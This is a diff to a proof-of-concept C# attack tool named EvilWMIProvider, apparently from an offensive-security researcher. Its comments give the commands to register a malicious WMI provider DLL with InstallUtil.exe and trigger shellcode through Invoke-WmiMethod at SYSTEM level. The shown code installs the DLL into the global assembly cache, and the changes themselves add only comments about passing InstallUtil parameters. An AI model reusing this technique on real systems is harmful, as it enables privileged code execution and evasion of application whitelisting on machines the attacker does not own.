@@ -5,7 +5,8 @@
 // Adapted For Proof of Concept By @subTee
 // Executes x64 ShellCode
 // 
-// Deliver and Install dll
+// Deliver and Install dll 
+// Execute InstallUtil from Path where dll is located
 // C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /i EvilWMIProvider.dll
 // Invoke calc for SYSTEM level calculations
 // Invoke-WmiMethod -Class Win32_Evil -Name ExecShellCalcCode
@@ -37,6 +38,15 @@ namespace EvilWMIProvider
         public override void Install(IDictionary stateSaver)
         {
             //This effectively does what gacutil does.
+            //TODO: Make Path a Parameter for InstallUtil
+            /*
+            To pass parameters using InstallUtil, the following is an example of passing the ServiceName:
+            InstallUtil /ServiceName="My Custom Service Name" MyCustomService.exe
+	    To access this in the ProjectInstaller / ServiceInstaller, you can simply use the following code:
+	    Context.Parameters["ServiceName"]
+	    
+            */
+            
             new System.EnterpriseServices.Internal.Publish().GacInstall("EvilWMIProvider.dll");
 
             base.Install(stateSaver);
